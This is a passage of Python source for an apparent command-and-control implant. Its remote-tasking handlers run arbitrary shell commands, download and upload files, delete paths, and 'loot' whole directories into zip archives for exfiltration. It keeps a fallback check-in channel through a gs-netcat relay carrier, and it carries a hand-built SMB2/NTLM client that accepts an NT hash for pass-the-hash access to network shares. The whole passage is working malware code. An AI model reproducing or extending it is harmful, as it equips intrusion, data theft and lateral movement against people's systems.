        egress decider gives it, and it is also the whole restart loop,
        since a cycle whose carrier died is a cycle where nothing
        delivered and the same condition brings it back. `_egress_gsocket`
        calls it for `egress gsocket`, which is an operator asking for
        that same start now instead of at the end of the next failed
        cycle -- and also how a `gsocket` rule of the decider's policy
        reaches the carrier. Both arrive here, so there is still exactly
        one place in this process that execs a `gs-netcat`, one restart
        delay and one attempt ceiling.

        The invariant is about the restart loop and not about the number
        of callers, which is why a second caller costs nothing where a
        timer or a watcher thread would cost something: either of those
        would be a *second* restart loop, and a restart loop in two places
        is a child that reappears after something stopped it -- which is
        what `carrier.py` and `supervisor.py` each say about themselves.
        So there is deliberately no timer and no watcher thread, and
        anything that wants the carrier up asks here rather than spawning
        one of its own.

        Never raises. Both callers run on the beacon thread, and the
        latch's call sits between a failed cycle and the rescue, where an
        exception would cost the rescue that is about to carry the reason.
        With the egress decider enabled the latch moves to just after the
        rescue instead, where an exception would cost the beacon its loop;
        the rule is the same from either position.
        """
        if not self.gsocket_enabled:
            return False
        if self._gsocket_problem:
            # Latched: the binary is not there, or the restart ceiling is
            # reached. Recorded on every cycle all the same -- the leg was
            # reached and produced nothing, and a record left empty packs
            # as `not_attempted`, which told an operator "QUIC: not tried"
            # about a leg that had timed out until that was fixed.
            self._record_leg("gsocket", self._gsocket_problem_class)
            return False

        proc = self._gsocket_proc
        if proc is not None:
            if proc.poll() is None:
                return True
            # It died on its own. `poll` has just reaped it; the exit code
            # is the only thing distinguishing "the relay refused us" from
            # "somebody killed it", and the child's output goes to
            # DEVNULL, as the tunnel child's does, so there is nothing
            # else to say.
            logger.debug("gsocket: the carrier (pid %d) is gone, exit %s",
                         proc.pid, proc.poll())
            self._gsocket_proc = None
            self._gsocket_ready_seen = False
            self._record_leg("gsocket", _RESCUE_CLASSES["carrier_failed"])
            if self.gsocket_max_restarts and \
                    self._gsocket_starts > self.gsocket_max_restarts:
                self._gsocket_problem = (
                    "the carrier has been started %d times and "
                    "max_restarts is %d, so this leg will not start another"
                    % (self._gsocket_starts, self.gsocket_max_restarts))
                self._gsocket_problem_class = \
                    _RESCUE_CLASSES["carrier_failed"]
                logger.warning("The gsocket leg is off: %s",
                               self._gsocket_problem)
                return False
            waited = time.monotonic() - (self._gsocket_started_at or 0.0)
            if waited < self.gsocket_restart_delay_seconds:
                # Measured from the previous start and not from the death,
                # so a carrier that ran for a week comes back on the next
                # cycle while one that failed on exec waits. The delay is
                # what keeps a `gs-netcat` that cannot work from being a
                # busy loop on the implant and a flood of joins on the
                # relay network.
                logger.debug("gsocket: %0.0fs since the last start, delay is "
                             "%ds; not restarting yet",
                             waited, self.gsocket_restart_delay_seconds)
                return False

        problem = self._gsocket_binary_problem()
        if problem is not None:
            # Verified before the exec and not after: a hash check
            # performed after the spawn is a hash check of something
            # already running. Latched, so the digest of a multi-megabyte
            # file is taken once rather than on every cycle, and so the
            # reason is logged once.
            self._gsocket_problem = problem
            self._gsocket_problem_class = _RESCUE_CLASSES["binary_missing"]
            logger.warning("The gsocket leg is off: %s", problem)
            self._record_leg("gsocket", _RESCUE_CLASSES["binary_missing"])
            return False

        try:
            self._gsocket_proc = subprocess.Popen(
                self._gsocket_argv(),
                stdin=subprocess.DEVNULL,
                # `gs-netcat` is a pipe tool: anything it wrote to our
                # stdout would land in the beacon's own log stream.
                # Discarded rather than captured, because a captured
                # stream nobody drains fills its pipe buffer and blocks
                # the child.
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                env=self._gsocket_environment(),
                close_fds=True,
                # Its own session, so a signal typed at whatever started
                # this beacon does not reach the carrier before the beacon
                # can take it down in order, and so `_gsocket_stop` can
                # signal the whole group: a `gs-netcat` that spawned
                # anything would otherwise leave it behind holding this
                # implant's address on the relay network.
                start_new_session=True)
        except OSError as exc:
            # Not latched: a host out of processes or descriptors is a
            # state that passes, unlike a binary that is not there.
            self._gsocket_proc = None
            logger.debug("gsocket: could not exec %s: %s",
                         self.gsocket_binary_path, exc)
            self._record_leg("gsocket", _RESCUE_CLASSES["carrier_failed"])
            return False

        self._gsocket_starts += 1
        self._gsocket_started_at = time.monotonic()
        self._gsocket_ready_seen = False
        logger.debug("gsocket: carrier started as pid %d, forward on "
                     "127.0.0.1:%d", self._gsocket_proc.pid,
                     self.gsocket_local_port)
        return True

    def _gsocket_forward_accepts(self) -> bool:
        """Whether something accepts on the forward's port, right now."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(_GSOCKET_PROBE_TIMEOUT)
        try:
            sock.connect(("127.0.0.1", self.gsocket_local_port))
            return True
        except OSError:
            return False
        finally:
            try:
                sock.close()
            except OSError:
                pass

    def _gsocket_ready(self) -> bool:
        """Whether the carrier is up and its forward can be posted to.

        Two things, in this order, and the order is what makes the answer
        usable. The child first: a forward port that accepts while our
        child is gone is somebody else's socket, and posting a check-in
        into it would send this implant's envelope to whatever bound the
        port. Then the forward itself.

        `ready_timeout_seconds` bounds the wait, and the wait is rarer than
        the setting's name suggests: the window is measured from the
        carrier's start, so once it has closed this returns at once, and
        once the forward has answered once it is not probed again. The
        latch starts the carrier at the *end* of a failed cycle, a whole
        beacon interval before the next one, so on the ordinary tasking
        path the window has always closed and this costs one connect
        attempt. The one place it really blocks is the fifth-failure
        re-registration, which starts the carrier and then walks
        `_registration_legs()` in the same pass. That is the warm
        half of the latch -- the second outage pays nothing, because the
        request about to go through the forward is a better probe than a
        connect that is thrown away, and a connect-and-close on every
        cycle would cost a relay session and a stray connection to the
        team server's beacon socket for an answer the request is about to
        give.
        """
        proc = self._gsocket_proc
        if proc is None or proc.poll() is not None:
            return False
        if self._gsocket_ready_seen:
            return True

        deadline = (self._gsocket_started_at or time.monotonic()) \
            + self.gsocket_ready_timeout_seconds
        while True:
            if proc.poll() is not None:
                # The commonest way this leg fails on a real host: the
                # forward's port is already taken, so `gs-netcat` exits
                # at once. Answered here rather than waited out, because
                # the window would otherwise be spent on a child that is
                # already gone.
                logger.debug("gsocket: the carrier exited with %s before its "
                             "forward came up", proc.poll())
                return False
            if self._gsocket_forward_accepts():
                self._gsocket_ready_seen = True
                return True
            if time.monotonic() >= deadline:
                logger.debug("gsocket: the forward on 127.0.0.1:%d did not "
                             "come up within %ds", self.gsocket_local_port,
                             self.gsocket_ready_timeout_seconds)
                return False
            if not self._running:
                # A stop arrived while we were waiting. `Beacon.stop`
                # joins this thread for five seconds and a readiness
                # window can be twenty, so a wait that ignored this would
                # outlive the join and post a check-in through a forward
                # the stop was about to take down.
                return False
            time.sleep(_GSOCKET_READY_POLL)

    def _gsocket_stop(self) -> None:
        """Take the carrier down. Called when the beacon stops, and there only.

        Not part of the latch: the latch starts the carrier and never
        stops it, which is what makes the second outage free. This exists
        because a `gs-netcat` that outlived the beacon would hold this
        implant's address on the relay network with nothing behind it, and
        the team server's carrier would keep pairing with it -- the same
        reason `Beacon.stop` takes the tunnel child with it.

        Safe when nothing is running, and deliberately so: `Beacon.stop`
        calls it without first working out whether a carrier was ever
        started.
        """
        proc = self._gsocket_proc
        self._gsocket_proc = None
        self._gsocket_ready_seen = False
        if proc is None or proc.poll() is not None:
            return
        logger.info("Beacon stopping: taking gsocket carrier pid %d with it",
                    proc.pid)
        self._gsocket_signal(proc, hard=False)
        code, _ = self._child_ending(proc)
        if code is None:
            self._gsocket_signal(proc, hard=True)
            code, ending = self._child_ending(proc)
            if code is None:
                # Nothing left to escalate to, so say so rather than
                # returning as though the carrier were down: it still
                # holds this implant's relay address.
                logger.warning("gsocket carrier pid %d survived a terminate "
                               "and a kill, and %s", proc.pid, ending)

    @staticmethod
    def _gsocket_signal(proc: subprocess.Popen, hard: bool) -> None:
        """Signal the child's whole process group, or the child alone.

        The group where there is one, because `start_new_session=True`
        made the child a group leader and anything it spawned is in there
        with it -- `gs-netcat` is a third-party binary and whether it
        forks is not ours to assume. `signal` and `os.killpg` are imported
        and reached for only on that path, for the reason
        `_shell_modules` gives: `killpg` does not exist on Windows and
        this file has to stay importable there, where `proc.terminate()`
        and `proc.kill()` are the right calls anyway.

        The fallbacks are the two races worth surviving: the child exited
        between our `poll` and our signal, or its group is no longer ours
        to signal.
        """
        if hasattr(os, "killpg") and hasattr(os, "getpgid"):
            import signal

            number = signal.SIGKILL if hard else signal.SIGTERM
            try:
                os.killpg(os.getpgid(proc.pid), number)
                return
            except ProcessLookupError:
                return
            except OSError:
                pass
        try:
            if hard:
                proc.kill()
            else:
                proc.terminate()
        except OSError:
            pass

    def _beacon_gsocket(self) -> Optional[dict]:
        """Check in through the carrier's forward.

        The carrier is not started here. It is started where
        `_beacon_loop` concludes that nothing delivered, which is *after*
        this leg has been tried -- so on the cycle that discovers an
        outage there is no carrier yet and this records `carrier_failed`.
        That is deliberate and it is the operator's own decision: a
        healthy implant holds no GSRN connection, so the first cycle of an
        outage is the cycle that pays for bringing one up. The record says
        the leg was reached and produced nothing, which is true, and the
        alternative -- leaving it empty, which packs as `not_attempted` --
        would tell an operator "GSOCKET: not tried" about the one leg
        being brought up for them.
        """
        if not self._gsocket_ready():
            self._record_leg("gsocket",
                             self._gsocket_problem_class
                             or _RESCUE_CLASSES["carrier_failed"])
            return None
        # Same shape as _beacon_smb and _beacon_quic, including the
        # register-when-unregistered arm: a beacon whose HTTPS leg never
        # came up has never registered, and this leg is bidirectional, so
        # it can do it. `_system_info()` already carries "id" and
        # "agent_id".
        info = dict(self._system_info(),
                    action="beacon" if self._registered else "register")
        return self._https_post("beacon", info, base=self._gsocket_base(),
                                transport="gsocket")

    def _send_result_gsocket(self, task_id: str, status: str, output: str,
                             data: Optional[dict] = None):
        """Report one task's result through the forward.

        Last in the result chain, as the leg is last in the tasking chain.
        """
        if not self._gsocket_ready():
            self._record_leg("gsocket",
                             self._gsocket_problem_class
                             or _RESCUE_CLASSES["carrier_failed"])
            return
        result = {
            "action": "result",
            "agent_id": self._agent_id or self._implant_id,
            "task_id": task_id,
            "status": status,
            "output": output,
        }
        if data:
            result["data"] = data
        self._https_post("result", result, base=self._gsocket_base(),
                         transport="gsocket")

    # ── Command execution (pure Python for file ops, subprocess only for shell) ──

    def _exec_shell(self, cmd: str, timeout: int = 300) -> str:
        try:
            r = subprocess.run(
                cmd, shell=True,
                capture_output=True, text=True,
                timeout=timeout,
            )
            output = r.stdout
            if r.stderr:
                output += f"\n[stderr]\n{r.stderr}"
            if r.returncode != 0:
                output += f"\n[exit {r.returncode}]"
            return output[:65536]
        except subprocess.TimeoutExpired:
            return f"[timeout after {timeout}s]"
        except Exception as e:
            return f"[error: {e}]"

    def _exec_ls(self, path: str = ".") -> str:
        try:
            p = Path(path)
            if not p.exists():
                return f"ls: {path}: No such file or directory"
            lines = []
            for entry in sorted(p.iterdir()):
                try:
                    st = entry.stat()
                    mode = stat.filemode(st.st_mode)
                    size = st.st_size
                    mtime = time.strftime("%Y-%m-%d %H:%M", time.localtime(st.st_mtime))
                    lines.append(f"{mode} {size:>10} {mtime} {entry.name}")
                except OSError:
                    lines.append(f"?????????? ? {entry.name}")
            return "\n".join(lines) if lines else "(empty)"
        except Exception as e:
            return f"[error: {e}]"

    def _exec_lsjson(self, path: str = ".") -> str:
        try:
            p = Path(path)
            if not p.exists():
                return json.dumps({"error": f"{path}: No such file or directory"})
            entries = []
            for entry in sorted(p.iterdir()):
                try:
                    st = entry.stat()
                    info = {
                        "name": entry.name,
                        "path": str(entry.resolve()),
                        "is_dir": entry.is_dir(),
                        "is_link": entry.is_symlink(),
                        "size": st.st_size,
                        "mode": stat.filemode(st.st_mode),
                        "mtime": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(st.st_mtime)),
                        "atime": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(st.st_atime)),
                        "ctime": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(st.st_ctime)),
                    }
                    if entry.is_symlink():
                        try:
                            info["link_target"] = str(entry.resolve())
                        except Exception:
                            info["link_target"] = "?"
                    ext = entry.suffix.lower()
                    if entry.is_dir():
                        info["type"] = "directory"
                    elif ext in (".py", ".js", ".ts", ".sh", ".bash", ".ps1", ".rb", ".go",
                                 ".c", ".h", ".cpp", ".rs", ".java", ".cs", ".php", ".pl"):
                        info["type"] = "code"
                    elif ext in (".txt", ".md", ".rst", ".log", ".csv", ".json", ".xml",
                                 ".yaml", ".yml", ".toml", ".ini", ".cfg", ".conf"):
                        info["type"] = "text"
                    elif ext in (".jpg", ".jpeg", ".png", ".gif", ".bmp", ".svg", ".ico"):
                        info["type"] = "image"
                    elif ext in (".zip", ".tar", ".gz", ".bz2", ".xz", ".7z", ".rar"):
                        info["type"] = "archive"
                    elif ext in (".exe", ".dll", ".so", ".dylib", ".elf", ".bin"):
                        info["type"] = "binary"
                    elif ext in (".key", ".pem", ".crt", ".cer", ".p12", ".pfx", ".jks"):
                        info["type"] = "cert"
                    elif ext in (".db", ".sqlite", ".sqlite3", ".mdb"):
                        info["type"] = "database"
                    else:
                        info["type"] = "file"
                    try:
                        if platform.system() != "Windows":
                            import pwd
                            import grp
                            info["owner"] = pwd.getpwuid(st.st_uid).pw_name
                            info["group"] = grp.getgrgid(st.st_gid).gr_name
                        else:
                            info["owner"] = ""
                            info["group"] = ""
                    except Exception:
                        info["owner"] = str(st.st_uid) if hasattr(st, "st_uid") else ""
                        info["group"] = str(st.st_gid) if hasattr(st, "st_gid") else ""
                    entries.append(info)
                except OSError:
                    entries.append({"name": entry.name, "error": True})
            return json.dumps({"path": str(p.resolve()), "entries": entries,
                               "count": len(entries)})
        except Exception as e:
            return json.dumps({"error": str(e)})

    def _exec_cat(self, path: str) -> str:
        try:
            return Path(path).read_text(errors="replace")[:65536]
        except Exception as e:
            return f"[error: {e}]"

    def _exec_download(self, path: str) -> dict:
        try:
            data = Path(path).read_bytes()
            if len(data) > 10 * 1024 * 1024:
                return {"error": f"File too large ({len(data)} bytes, max 10MB)"}
            return {
                "filename": Path(path).name,
                "size": len(data),
                "data": base64.b64encode(data).decode(),
            }
        except Exception as e:
            return {"error": str(e)}

    def _exec_loot(self, path: str) -> dict:
        """Zip a directory recursively and return as downloadable data."""
        try:
            p = Path(path)
            if not p.exists():
                return {"error": f"{path}: No such file or directory"}
            if p.is_file():
                return self._exec_download(path)
            buf = io.BytesIO()
            file_count = 0
            max_size = 50 * 1024 * 1024
            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=6) as zf:
                for root, dirs, files in os.walk(str(p)):
                    for fn in files:
                        fp = Path(root) / fn
                        try:
                            arcname = str(fp.relative_to(p))
                            if fp.stat().st_size > max_size:
                                continue
                            zf.write(str(fp), arcname)
                            file_count += 1
                        except (PermissionError, OSError):
                            continue
                        if buf.tell() > max_size:
                            break
                    if buf.tell() > max_size:
                        break
            data = buf.getvalue()
            dirname = p.name or "root"
            filename = f"{dirname}.zip"
            return {
                "filename": filename,
                "size": len(data),
                "files": file_count,
                "data": base64.b64encode(data).decode(),
                "loot": True,
            }
        except Exception as e:
            return {"error": str(e)}

    def _exec_upload(self, path: str, data_b64: str) -> str:
        try:
            target = Path(path)
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(base64.b64decode(data_b64))
            return f"Uploaded {target} ({target.stat().st_size} bytes)"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_pwd() -> str:
        return os.getcwd()

    @staticmethod
    def _exec_cd(path: str) -> str:
        try:
            os.chdir(path)
            return os.getcwd()
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_cp(src: str, dst: str) -> str:
        try:
            if Path(src).is_dir():
                shutil.copytree(src, dst)
            else:
                shutil.copy2(src, dst)
            return f"Copied {src} -> {dst}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_mv(src: str, dst: str) -> str:
        try:
            shutil.move(src, dst)
            return f"Moved {src} -> {dst}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_rm(path: str) -> str:
        try:
            p = Path(path)
            if p.is_dir():
                shutil.rmtree(path)
            else:
                p.unlink()
            return f"Removed {path}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_mkdir(path: str) -> str:
        try:
            Path(path).mkdir(parents=True, exist_ok=True)
            return f"Created {path}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_chmod(mode: str, path: str) -> str:
        try:
            os.chmod(path, int(mode, 8))
            return f"chmod {mode} {path}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_write(path: str, content: str) -> str:
        try:
            target = Path(path)
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(content)
            return f"Wrote {len(content)} bytes to {path}"
        except Exception as e:
            return f"[error: {e}]"

    # ── SMBLoot (pure-Python SMB2 client, no impacket) ──

    def _smb2_negotiate(self, sock: socket.socket) -> bytes:
        """SMB2 Negotiate → returns server GUID + security blob."""
        neg = bytearray(36)
        struct.pack_into("<H", neg, 0, 36)       # StructureSize
        struct.pack_into("<H", neg, 2, 2)        # DialectCount
        struct.pack_into("<H", neg, 4, 1)        # SecurityMode (signing enabled)
        struct.pack_into("<H", neg, 6, 0)        # Reserved
        struct.pack_into("<I", neg, 8, 0)        # Capabilities
        neg += b"\x00" * 16                      # ClientGuid
        neg += struct.pack("<I", 0)              # NegotiateContextOffset
        neg += struct.pack("<H", 0)              # NegotiateContextCount
        neg += struct.pack("<H", 0)              # Reserved2
        neg += struct.pack("<H", 0x0202)         # Dialect SMB 2.0.2
        neg += struct.pack("<H", 0x0210)         # Dialect SMB 2.1
        self._smb2_send(sock, 0x0000, 0, 0, bytes(neg))
        return self._smb2_recv(sock)

    def _smb2_send(self, sock: socket.socket, command: int,
                   msg_id: int, tree_id: int, payload: bytes,
                   session_id: int = 0, flags: int = 0):
        """Send an SMB2 packet with NetBIOS framing."""
        hdr = bytearray(64)
        hdr[0:4] = b"\xfeSMB"
        struct.pack_into("<H", hdr, 4, 64)       # StructureSize
        struct.pack_into("<H", hdr, 6, 0)        # CreditCharge
        struct.pack_into("<I", hdr, 8, 0)        # Status
        struct.pack_into("<H", hdr, 12, command)
        struct.pack_into("<H", hdr, 14, 1)       # CreditRequest
        struct.pack_into("<I", hdr, 16, flags)
        struct.pack_into("<I", hdr, 20, 0)       # NextCommand
        struct.pack_into("<Q", hdr, 24, msg_id)
        struct.pack_into("<I", hdr, 36, tree_id)
        struct.pack_into("<Q", hdr, 40, session_id)
        hdr[48:64] = b"\x00" * 16               # Signature
        pkt = bytes(hdr) + payload
        nb = struct.pack(">I", len(pkt))
        sock.sendall(nb + pkt)

    def _smb2_recv(self, sock: socket.socket) -> bytes:
        """Receive an SMB2 response, return full packet (header + body)."""
        nb_hdr = self._recv_exact(sock, 4)
        length = struct.unpack(">I", nb_hdr)[0]
        return self._recv_exact(sock, length)

    @staticmethod
    def _recv_exact(sock: socket.socket, n: int) -> bytes:
        buf = bytearray()
        while len(buf) < n:
            chunk = sock.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("SMB connection closed")
            buf.extend(chunk)
        return bytes(buf)

    def _ntlmv2_hash(self, password: str, username: str, domain: str) -> bytes:
        """Compute NTLMv2 hash (NT hash → HMAC-MD5 with user+domain)."""
        import hmac as _hmac
        nt_hash = hashlib.new("md4", password.encode("utf-16-le")).digest()
        identity = (username.upper() + domain.upper()).encode("utf-16-le")
        return _hmac.new(nt_hash, identity, hashlib.md5).digest()

    def _ntlm_auth(self, sock: socket.socket, username: str, password: str,
                   domain: str, nt_hash: bytes = None) -> tuple:
        """NTLM authentication over SMB2 SessionSetup. Returns (session_id, session_key)."""
        import hmac as _hmac

        # Type 1 (Negotiate)
        neg_flags = 0xe2088217
        type1 = b"NTLMSSP\x00" + struct.pack("<I", 1)
        type1 += struct.pack("<I", neg_flags)
        type1 += struct.pack("<HHI", 0, 0, 0)  # DomainNameFields
        type1 += struct.pack("<HHI", 0, 0, 0)  # WorkstationFields

        # Wrap in GSS-API / SPNEGO
        blob1 = self._gss_wrap_ntlm(type1, is_init=True)

        # SessionSetup request
        setup = bytearray(24)
        struct.pack_into("<H", setup, 0, 25)    # StructureSize
        struct.pack_into("<B", setup, 2, 0)     # Flags
        struct.pack_into("<B", setup, 3, 1)     # SecurityMode
        struct.pack_into("<I", setup, 4, 0)     # Capabilities
        struct.pack_into("<I", setup, 8, 0)     # Channel
        struct.pack_into("<H", setup, 12, 88)   # SecurityBufferOffset (64 hdr + 24 body)
        struct.pack_into("<H", setup, 14, len(blob1))
        struct.pack_into("<Q", setup, 16, 0)    # PreviousSessionId
        self._smb2_send(sock, 0x0001, 1, 0, bytes(setup) + blob1)
        resp1 = self._smb2_recv(sock)

        status = struct.unpack_from("<I", resp1, 8)[0]
        session_id = struct.unpack_from("<Q", resp1, 40)[0]

        if status != 0xc0000016:  # STATUS_MORE_PROCESSING_REQUIRED
            raise PermissionError(f"NTLM negotiate failed: 0x{status:08x}")

        # Extract Type 2 (Challenge) from response
        sec_offset = struct.unpack_from("<H", resp1, 64 + 4)[0]
        sec_length = struct.unpack_from("<H", resp1, 64 + 6)[0]
        sec_blob = resp1[sec_offset:sec_offset + sec_length]
        type2 = self._gss_unwrap_ntlm(sec_blob)

        # Parse Type 2
        server_challenge = type2[24:32]
        target_info_len = struct.unpack_from("<H", type2, 40)[0]
        target_info_off = struct.unpack_from("<I", type2, 44)[0]
        target_info = type2[target_info_off:target_info_off + target_info_len]

        # Compute NTLMv2 response
        if nt_hash:
            response_key = _hmac.new(nt_hash,
                                     (username.upper() + domain.upper()).encode("utf-16-le"),
                                     hashlib.md5).digest()
        else:
            nt_h = hashlib.new("md4", password.encode("utf-16-le")).digest()
            response_key = _hmac.new(nt_h,
                                     (username.upper() + domain.upper()).encode("utf-16-le"),
                                     hashlib.md5).digest()

        client_challenge = os.urandom(8)
        timestamp = struct.pack("<Q", int((time.time() + 11644473600) * 10000000))
        blob = b"\x01\x01\x00\x00\x00\x00\x00\x00"
        blob += timestamp
        blob += client_challenge
        blob += b"\x00\x00\x00\x00"
        blob += target_info
        blob += b"\x00\x00\x00\x00"

        nt_proof = _hmac.new(response_key, server_challenge + blob, hashlib.md5).digest()
        nt_response = nt_proof + blob
        session_key = _hmac.new(response_key, nt_proof, hashlib.md5).digest()

        # Build Type 3 (Authenticate)
        domain_enc = domain.encode("utf-16-le")
        user_enc = username.encode("utf-16-le")
        ws_enc = platform.node().encode("utf-16-le")

        off = 88
        type3 = b"NTLMSSP\x00" + struct.pack("<I", 3)
        # LmChallengeResponse (24 bytes of zeros)
        lm_resp = b"\x00" * 24
        type3 += struct.pack("<HHI", len(lm_resp), len(lm_resp), off)
        off += len(lm_resp)
        type3 += struct.pack("<HHI", len(nt_response), len(nt_response), off)
        off += len(nt_response)
        type3 += struct.pack("<HHI", len(domain_enc), len(domain_enc), off)
        off += len(domain_enc)
        type3 += struct.pack("<HHI", len(user_enc), len(user_enc), off)
        off += len(user_enc)
        type3 += struct.pack("<HHI", len(ws_enc), len(ws_enc), off)
        off += len(ws_enc)
        type3 += struct.pack("<HHI", 0, 0, off)  # EncryptedRandomSession
        type3 += struct.pack("<I", neg_flags)
        type3 += b"\x00" * (88 - len(type3))  # Pad to offset
        type3 += lm_resp + nt_response + domain_enc + user_enc + ws_enc

        blob3 = self._gss_wrap_ntlm(type3, is_init=False)

        setup2 = bytearray(24)
        struct.pack_into("<H", setup2, 0, 25)
        struct.pack_into("<B", setup2, 2, 0)
        struct.pack_into("<B", setup2, 3, 1)
        struct.pack_into("<I", setup2, 4, 0)
        struct.pack_into("<I", setup2, 8, 0)
        struct.pack_into("<H", setup2, 12, 88)
        struct.pack_into("<H", setup2, 14, len(blob3))
        struct.pack_into("<Q", setup2, 16, 0)
        self._smb2_send(sock, 0x0001, 2, 0, bytes(setup2) + blob3, session_id=session_id)
        resp2 = self._smb2_recv(sock)

        status2 = struct.unpack_from("<I", resp2, 8)[0]
        if status2 != 0:
            raise PermissionError(f"NTLM auth failed: 0x{status2:08x}")

        return session_id, session_key

    @staticmethod
    def _gss_wrap_ntlm(ntlm_bytes: bytes, is_init: bool) -> bytes:
        """Minimal SPNEGO wrapper for NTLM tokens."""
        ntlm_oid = b"\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"  # 1.3.6.1.4.1.311.2.2.10
        spnego_oid = b"\x2b\x06\x01\x05\x05\x02"  # 1.2.840.113554.1.2.2

        def _asn1_len(length: int) -> bytes:
            if length < 0x80:
                return struct.pack("B", length)
            elif length < 0x100:
                return b"\x81" + struct.pack("B", length)
            else:
                return b"\x82" + struct.pack(">H", length)

        if is_init:
            # mechToken [2]
            mech_token = b"\xa2" + _asn1_len(len(ntlm_bytes) + 2) + \
                         b"\x04" + _asn1_len(len(ntlm_bytes)) + ntlm_bytes
            # mechTypes [0]
            mech_type = b"\x06" + _asn1_len(len(ntlm_oid)) + ntlm_oid
            mech_list = b"\x30" + _asn1_len(len(mech_type)) + mech_type
            mech_types = b"\xa0" + _asn1_len(len(mech_list)) + mech_list
            # negTokenInit SEQUENCE
            inner = mech_types + mech_token
            neg_init = b"\xa0" + _asn1_len(len(inner)) + inner
            neg_seq = b"\x30" + _asn1_len(len(neg_init)) + neg_init
            # Application [0] with SPNEGO OID
            oid_enc = b"\x06" + _asn1_len(len(spnego_oid)) + spnego_oid
            app_inner = oid_enc + neg_seq
            return b"\x60" + _asn1_len(len(app_inner)) + app_inner
        else:
            # negTokenResp: responseToken [2]
            resp_token = b"\xa2" + _asn1_len(len(ntlm_bytes) + 2) + \
                         b"\x04" + _asn1_len(len(ntlm_bytes)) + ntlm_bytes
            inner = resp_token
            return b"\xa1" + _asn1_len(len(inner) + 2) + \
                   b"\x30" + _asn1_len(len(inner)) + inner

    @staticmethod
    def _gss_unwrap_ntlm(blob: bytes) -> bytes:
        """Extract NTLM message from SPNEGO response blob."""
        # Search for NTLMSSP signature
        idx = blob.find(b"NTLMSSP\x00")
        if idx >= 0:
            return blob[idx:]
        raise ValueError("NTLMSSP not found in security blob")

    def _smb2_tree_connect(self, sock: socket.socket, session_id: int,
                           msg_id: int, share_path: str) -> tuple:
        """TreeConnect to \\\\server\\share. Returns (tree_id, next_msg_id)."""
        path_enc = share_path.encode("utf-16-le")
        tc = bytearray(8)
        struct.pack_into("<H", tc, 0, 9)     # StructureSize
        struct.pack_into("<H", tc, 2, 0)     # Reserved
        struct.pack_into("<H", tc, 4, 72)    # PathOffset (64+8)
        struct.pack_into("<H", tc, 6, len(path_enc))
        self._smb2_send(sock, 0x0003, msg_id, 0, bytes(tc) + path_enc,
                        session_id=session_id)
        resp = self._smb2_recv(sock)
        status = struct.unpack_from("<I", resp, 8)[0]
        if status != 0:
            raise PermissionError(f"TreeConnect failed: 0x{status:08x} ({share_path})")
        tree_id = struct.unpack_from("<I", resp, 36)[0]
        return tree_id, msg_id + 1

    def _smb2_create(self, sock: socket.socket, session_id: int,
                     tree_id: int, msg_id: int, path: str,
                     desired_access: int = 0x80000000,
                     disposition: int = 1,
                     options: int = 0) -> tuple:
        """SMB2 Create (open file/dir). Returns (file_id_bytes, next_msg_id)."""
        name_enc = path.encode("utf-16-le") if path else b""
        cr = bytearray(56)
        struct.pack_into("<H", cr, 0, 57)           # StructureSize
        struct.pack_into("<B", cr, 2, 0)            # SecurityFlags
        struct.pack_into("<B", cr, 3, 0)            # RequestedOplockLevel
        struct.pack_into("<I", cr, 4, disposition)  # ImpersonationLevel=Impersonation
        struct.pack_into("<Q", cr, 8, 0)            # SmbCreateFlags
        struct.pack_into("<Q", cr, 16, 0)           # Reserved
        struct.pack_into("<I", cr, 24, desired_access)
        struct.pack_into("<I", cr, 28, 0x07)        # FileAttributes (normal)
        struct.pack_into("<I", cr, 32, 0x07)        # ShareAccess (R|W|D)
        struct.pack_into("<I", cr, 36, disposition)
        struct.pack_into("<I", cr, 40, options)
        struct.pack_into("<H", cr, 44, 120)         # NameOffset (64+56)
        struct.pack_into("<H", cr, 46, len(name_enc))
        struct.pack_into("<I", cr, 48, 0)           # CreateContextsOffset
        struct.pack_into("<I", cr, 52, 0)           # CreateContextsLength
        payload = bytes(cr) + (name_enc if name_enc else b"\x00\x00")
        self._smb2_send(sock, 0x0005, msg_id, tree_id, payload,
                        session_id=session_id)
        resp = self._smb2_recv(sock)
        status = struct.unpack_from("<I", resp, 8)[0]
        if status != 0:
            raise FileNotFoundError(f"Create failed: 0x{status:08x} ({path})")
        file_id = resp[64 + 56:64 + 56 + 16]
        return file_id, msg_id + 1

    def _smb2_query_directory(self, sock: socket.socket, session_id: int,
                              tree_id: int, msg_id: int,
                              file_id: bytes, pattern: str = "*") -> tuple:
        """SMB2 QueryDirectory (FileBothDirectoryInformation). Returns (entries, next_msg_id)."""
        pat_enc = pattern.encode("utf-16-le")
        qd = bytearray(32)
        struct.pack_into("<H", qd, 0, 33)          # StructureSize
        struct.pack_into("<B", qd, 2, 0x03)        # FileInfoClass: FileBothDirectoryInformation
        struct.pack_into("<B", qd, 3, 0)            # Flags
        struct.pack_into("<I", qd, 4, 0)            # FileIndex
        qd[8:24] = file_id
        struct.pack_into("<H", qd, 24, 96)          # FileNameOffset (64+32)
        struct.pack_into("<H", qd, 26, len(pat_enc))
        struct.pack_into("<I", qd, 28, 65536)       # OutputBufferLength

        entries = []
        first = True
        while True:
            if not first:
                struct.pack_into("<B", qd, 3, 0)
            self._smb2_send(sock, 0x000e, msg_id, tree_id,
                            bytes(qd) + pat_enc, session_id=session_id)
            resp = self._smb2_recv(sock)
            msg_id += 1
            status = struct.unpack_from("<I", resp, 8)[0]
            if status == 0x80000006:  # STATUS_NO_MORE_FILES
                break
            if status != 0:
                break
            out_offset = struct.unpack_from("<H", resp, 64 + 2)[0]
